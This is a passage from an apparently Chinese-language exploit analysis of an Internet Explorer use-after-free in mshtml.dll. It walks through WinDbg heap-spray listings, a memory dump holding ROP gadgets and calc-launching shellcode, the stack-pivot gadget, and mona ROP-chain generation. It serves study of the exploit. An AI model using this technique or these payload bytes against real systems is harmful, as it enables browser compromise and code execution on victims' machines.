      06d50018 1fffc fffc  [00]   06d50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06e50018 1fffc fffc  [00]   06e50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06f50018 1fffc fffc  [00]   06f50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07050018 1fffc fffc  [00]   07050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07150018 1fffc fffc  [00]   07150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07250018 1fffc fffc  [00]   07250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07350018 1fffc fffc  [00]   07350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07450018 1fffc fffc  [00]   07450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07550018 1fffc fffc  [00]   07550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07650018 1fffc fffc  [00]   07650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07750018 1fffc fffc  [00]   07750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07850018 1fffc fffc  [00]   07850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07950018 1fffc fffc  [00]   07950020    fffe0 - (busy VirtualAlloc) # 查看这一块</span><br><span class=\"line\">        07a50018 1fffc fffc  [00]   07a50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07b50018 1fffc fffc  [00]   07b50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07c50018 1fffc fffc  [00]   07c50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07d50018 1fffc fffc  [00]   07d50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07e50018 1fffc fffc  [00]   07e50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        07f50018 1fffc fffc  [00]   07f50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08050018 1fffc fffc  [00]   08050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08150018 1fffc fffc  [00]   08150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08250018 1fffc fffc  [00]   08250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08350018 1fffc fffc  [00]   08350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08450018 1fffc fffc  [00]   08450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08550018 1fffc fffc  [00]   08550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08650018 1fffc fffc  [00]   08650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08750018 1fffc fffc  [00]   08750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08850018 1fffc fffc  [00]   08850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08950018 1fffc fffc  [00]   08950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08a50018 1fffc fffc  [00]   08a50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08b50018 1fffc fffc  [00]   08b50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08c50018 1fffc fffc  [00]   08c50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08d50018 1fffc fffc  [00]   08d50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08e50018 1fffc fffc  [00]   08e50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        08f50018 1fffc fffc  [00]   08f50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09050018 1fffc fffc  [00]   09050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09150018 1fffc fffc  [00]   09150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09250018 1fffc fffc  [00]   09250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09350018 1fffc fffc  [00]   09350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09450018 1fffc fffc  [00]   09450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09550018 1fffc fffc  [00]   09550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09650018 1fffc fffc  [00]   09650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09750018 1fffc fffc  [00]   09750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09850018 1fffc fffc  [00]   09850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09950018 1fffc fffc  [00]   09950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09a50018 1fffc fffc  [00]   09a50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09b50018 1fffc fffc  [00]   09b50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09c50018 1fffc fffc  [00]   09c50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09d50018 1fffc fffc  [00]   09d50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09e50018 1fffc fffc  [00]   09e50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        09f50018 1fffc fffc  [00]   09f50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a050018 1fffc fffc  [00]   0a050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a150018 1fffc fffc  [00]   0a150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a250018 1fffc fffc  [00]   0a250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a350018 1fffc fffc  [00]   0a350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a450018 1fffc fffc  [00]   0a450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a550018 1fffc fffc  [00]   0a550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a650018 1fffc fffc  [00]   0a650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a750018 1fffc fffc  [00]   0a750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a850018 1fffc fffc  [00]   0a850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0a950018 1fffc fffc  [00]   0a950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0aa50018 1fffc fffc  [00]   0aa50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ab50018 1fffc fffc  [00]   0ab50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ac50018 1fffc fffc  [00]   0ac50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ad50018 1fffc fffc  [00]   0ad50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ae50018 1fffc fffc  [00]   0ae50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0af50018 1fffc fffc  [00]   0af50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b050018 1fffc fffc  [00]   0b050020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b150018 1fffc fffc  [00]   0b150020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b250018 1fffc fffc  [00]   0b250020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b350018 1fffc fffc  [00]   0b350020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b450018 1fffc fffc  [00]   0b450020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b550018 1fffc fffc  [00]   0b550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b650018 1fffc fffc  [00]   0b650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b750018 1fffc fffc  [00]   0b750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b850018 1fffc fffc  [00]   0b850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0b950018 1fffc fffc  [00]   0b950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0ba50018 1fffc fffc  [00]   0ba50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0bb50018 1fffc fffc  [00]   0bb50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0bc50018 1fffc fffc  [00]   0bc50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0bd50018 1fffc fffc  [00]   0bd50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0be50018 1fffc fffc  [00]   0be50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        0bf50018 1fffc fffc  [00]   0bf50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">    _HEAP @ 10000</span><br><span class=\"line\">    _HEAP @ 2f0000</span><br><span class=\"line\">    _HEAP @ 1240000</span><br><span class=\"line\">    _HEAP @ 24a0000</span><br><span class=\"line\">    _HEAP @ 2cc0000</span><br></pre></td></tr></table></figure>\n<p>重点关注0x7950018这一块，可以看到从0x7950024开始是0x1c字节的padding，然后就是shellcode，也就是说0x79500040是一个可用的gadget地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd 07950018 L 100</span><br><span class=\"line\">07950018  2498ef9a 04000000 000fffda 41414141</span><br><span class=\"line\">07950028  42424242 43434343 41414141 42424242</span><br><span class=\"line\">07950038  43434343 41414141 6b661041 6b662c60</span><br><span class=\"line\">07950048  6b67b43b 6b662c60 6b662c60 6b663059</span><br><span class=\"line\">07950058  00001024 6b6fced0 00000040 6b662fa9</span><br><span class=\"line\">07950068  6bb9fe20 6b6630ae 6b661041 6b662f0b</span><br><span class=\"line\">07950078  6b66f920 6b674ef7 6b661348 6b6cf0bb</span><br><span class=\"line\">07950088  6b6994a1 6b6c3d7e 90909090 90909090</span><br><span class=\"line\">07950098  90909090 0089e8fc 89600000 64d231e5</span><br><span class=\"line\">079500a8  8b30528b 528b0c52 28728b14 264ab70f</span><br><span class=\"line\">079500b8  c031ff31 7c613cac c1202c02 c7010dcf</span><br><span class=\"line\">079500c8  5752f0e2 8b10528b d0013c42 8578408b</span><br><span class=\"line\">079500d8  014a74c0 488b50d0 20588b18 3ce3d301</span><br><span class=\"line\">079500e8  8b348b49 ff31d601 c1acc031 c7010dcf</span><br><span class=\"line\">079500f8  f475e038 3bf87d03 e275247d 24588b58</span><br><span class=\"line\">07950108  8b66d301 588b4b0c 8bd3011c d0018b04</span><br><span class=\"line\">07950118  24244489 59615b5b e0ff515a 8b5a5f58</span><br><span class=\"line\">07950128  5d86eb12 858d016a 000000b9 8b316850</span><br><span class=\"line\">07950138  d5ff876f a2b5f0bb 95a66856 d5ff9dbd</span><br><span class=\"line\">07950148  0a7c063c 75e0fb80 1347bb05 006a6f72</span><br><span class=\"line\">07950158  63d5ff53 2e636c61 00657865 90909090</span><br><span class=\"line\">07950168  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950178  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950188  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950198  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501a8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501b8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501c8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501d8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501e8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">079501f8  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950208  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950218  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950228  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950238  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950248  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950258  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950268  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950278  90909090 90909090 90909090 90909090</span><br><span class=\"line\">07950288  90909090 90909090 90909090 90909090</span><br></pre></td></tr></table></figure>\n<p>同理，可用地址还有0810，0fe0，17b0，1f80……，每次增加0x7d0，这是因为一个最小单元的块是1000*2（0x7d0）。所以exp中的0x6da0也符合条件，验证如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; dd 079f6da0</span><br><span class=\"line\">079f6da0  6b661041 6b662c60 6b67b43b 6b662c60</span><br><span class=\"line\">079f6db0  6b662c60 6b663059 00001024 6b6fced0</span><br><span class=\"line\">079f6dc0  00000040 6b662fa9 6bb9fe20 6b6630ae</span><br><span class=\"line\">079f6dd0  6b661041 6b662f0b 6b66f920 6b674ef7</span><br><span class=\"line\">079f6de0  6b661348 6b6cf0bb 6b6994a1 6b6c3d7e</span><br><span class=\"line\">079f6df0  90909090 90909090 90909090 0089e8fc</span><br><span class=\"line\">079f6e00  89600000 64d231e5 8b30528b 528b0c52</span><br><span class=\"line\">079f6e10  28728b14 264ab70f c031ff31 7c613cac</span><br></pre></td></tr></table></figure>\n<p>至此，我们终于理清了堆喷的思路，就是整齐的摆放堆块，使得gadget地址位于可预测的位置，在Glibc pwn中也有类似细微的操作。</p>\n<p><strong>不过还需要提一句的是，CButtonLayout对象的vftable是如何控制调用流程的呢？即，这个虚函数是在什么时候被怎样调用的？</strong></p>\n<p>在xchg指令处下断点：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:013&gt; bp 0x1B43B+686a0000 </span><br><span class=\"line\">0:013&gt; g</span><br><span class=\"line\">ModLoad: 6c4f0000 6c5a2000   C:\\Windows\\System32\\jscript.dll</span><br><span class=\"line\">Breakpoint 0 hit</span><br><span class=\"line\">eax=079f6da0 ebx=01000000 ecx=034cd3b0 edx=00000041 esi=024ccf00 edi=034cea40</span><br><span class=\"line\">eip=686bb43b esp=024ccd38 ebp=024ccd70 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTreeNode::GetParentWidth+0x9c:</span><br><span class=\"line\">686bb43b 94              xchg    eax,esp</span><br><span class=\"line\">0:005&gt; dd 034cd3b0 </span><br><span class=\"line\">034cd3b0  079f6da0 0047e9e0 034cea40 687f8690</span><br><span class=\"line\">034cd3c0  79f6da08 00000000 01080809 ffffffff</span><br><span class=\"line\">034cd3d0  00000000 00000000 00000000 ffffffff</span><br><span class=\"line\">034cd3e0  00000080 ffffffff 00000000 00000000</span><br><span class=\"line\">034cd3f0  00000000 00000000 00000000 00000024</span><br><span class=\"line\">034cd400  00000020 00000000 00000000 00000000</span><br><span class=\"line\">034cd410  00000000 00000000 00000000 00000000</span><br><span class=\"line\">034cd420  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>\n<p><strong>此时eax实际上为要栈迁移的地址，而这个地址来源于ecx，应该有<code>mov eax, [ecx]</code>，所以之前的call [eax+8]实际上就是直接跳转到<code>xchg</code>这条指令，然后将esp修改为第一条gadget的地址（retn），然后再通过第二条gadget pop;ret，将<code>xchg</code>指令过掉，从而执行下面的<code>VirtualProtect</code>ROP。</strong></p>\n<h4 id=\"Rop链\"><a href=\"#Rop链\" class=\"headerlink\" title=\"Rop链\"></a>Rop链</h4><p>现在我们已经将EIP劫持到了可控位置，下一步就是写Rop链了。</p>\n<p>首先使用mona的rop方法试一下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">!py mona.py rop -m mshtml.dll -cpb \\x00</span><br></pre></td></tr></table></figure>\n<p>确实手动生成了rop链，但是耗时较长。</p>\n<p>输出文件有stackpivot.txt, rop.txt, rop_suggestions.txt和rop_chains.txt。最终的结果是在rop_chains.txt中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\"> Module info :</span><br><span class=\"line\">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\"> Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename &amp; Path</span><br><span class=\"line\">-----------------------------------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\"> 0x72a50000 | 0x734d0000 | 0x00a80000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [IEFRAME.dll] (C:\\Windows\\system32\\IEFRAME.dll)</span><br><span class=\"line\"> 0x74670000 | 0x746a9000 | 0x00039000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [MMDevAPI.DLL] (C:\\Windows\\system32\\MMDevAPI.DLL)</span><br><span class=\"line\"> 0x76300000 | 0x76436000 | 0x00136000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [urlmon.dll] (C:\\Windows\\system32\\urlmon.dll)</span><br><span class=\"line\"> 0x74660000 | 0x74667000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [AVRT.dll] (C:\\Windows\\system32\\AVRT.dll)</span><br><span class=\"line\"> 0x6b2d0000 | 0x6b887000 | 0x005b7000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [mshtml.dll] (C:\\Windows\\System32\\mshtml.dll)</span><br><span class=\"line\"> 0x70790000 | 0x707c0000 | 0x00030000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [wdmaud.drv] (C:\\Windows\\system32\\wdmaud.drv)</span><br><span class=\"line\"> 0x75c00000 | 0x75c4c000 | 0x0004c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [apphelp.dll] (C:\\Windows\\system32\\apphelp.dll)</span><br><span class=\"line\"> 0x75ee0000 | 0x75ffd000 | 0x0011d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [CRYPT32.dll] (C:\\Windows\\system32\\CRYPT32.dll)</span><br><span class=\"line\"> 0x75d70000 | 0x75d7c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [MSASN1.dll] (C:\\Windows\\system32\\MSASN1.dll)</span><br><span class=\"line\"> 0x76000000 | 0x760d4000 | 0x000d4000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [kernel32.dll] (C:\\Windows\\system32\\kernel32.dll)</span><br><span class=\"line\"> 0x773f0000 | 0x7749c000 | 0x000ac000 | False  | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\\Windows\\system32\\msvcrt.dll)</span><br><span class=\"line\"> 0x75c50000 | 0x75c5c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\\Windows\\system32\\CRYPTBASE.dll)</span><br><span class=\"line\"> 0x705f0000 | 0x70626000 | 0x00036000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [AUDIOSES.DLL] (C:\\Windows\\system32\\AUDIOSES.DLL)</span><br><span class=\"line\"> 0x746b0000 | 0x746c3000 | 0x00013000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [dwmapi.dll] (C:\\Windows\\system32\\dwmapi.dll)</span><br><span class=\"line\"> 0x77bb0000 | 0x77cec000 | 0x0013c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ntdll.dll] (C:\\Windows\\SYSTEM32\\ntdll.dll)</span><br><span class=\"line\"> 0x6d8d0000 | 0x6d8fb000 | 0x0002b000 | False  | True    | True  |  True    | False  | 8.0.7601.17514 [ieproxy.dll] (C:\\Program Files\\Internet Explorer\\ieproxy.dll)</span><br><span class=\"line\"> 0x775a0000 | 0x775b9000 | 0x00019000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\\Windows\\SYSTEM32\\sechost.dll)</span><br><span class=\"line\"> 0x76180000 | 0x76185000 | 0x00005000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [PSAPI.DLL] (C:\\Windows\\system32\\PSAPI.DLL)</span><br><span class=\"line\"> 0x77cf0000 | 0x77cfa000 | 0x0000a000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\\Windows\\system32\\LPK.dll)</span><br><span class=\"line\"> 0x77930000 | 0x77b2b000 | 0x001fb000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [iertutil.dll] (C:\\Windows\\system32\\iertutil.dll)</span><br><span class=\"line\"> 0x70750000 | 0x70754000 | 0x00004000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ksuser.dll] (C:\\Windows\\system32\\ksuser.dll)</span><br><span class=\"line\"> 0x775c0000 | 0x7765d000 | 0x0009d000 | False  | True    | True  |  True    | True   | 1.626.7601.17514 [USP10.dll] (C:\\Windows\\system32\\USP10.dll)</span><br><span class=\"line\"> 0x771c0000 | 0x772b5000 | 0x000f5000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [WININET.dll] (C:\\Windows\\system32\\WININET.dll)</span><br><span class=\"line\"> 0x73ec0000 | 0x73ec7000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WINNSI.DLL] (C:\\Windows\\system32\\WINNSI.DLL)</span><br><span class=\"line\"> 0x75bd0000 | 0x75beb000 | 0x0001b000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SspiCli.dll] (C:\\Windows\\system32\\SspiCli.dll)</span><br><span class=\"line\"> 0x73ef0000 | 0x73f0c000 | 0x0001c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [iphlpapi.DLL] (C:\\Windows\\system32\\iphlpapi.DLL)</span><br><span class=\"line\"> 0x75ec0000 | 0x75ed2000 | 0x00012000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [DEVOBJ.dll] (C:\\Windows\\system32\\DEVOBJ.dll)</span><br><span class=\"line\"> 0x761a0000 | 0x762fc000 | 0x0015c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ole32.dll] (C:\\Windows\\system32\\ole32.dll)</span><br><span class=\"line\"> 0x76460000 | 0x764b7000 | 0x00057000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHLWAPI.dll] 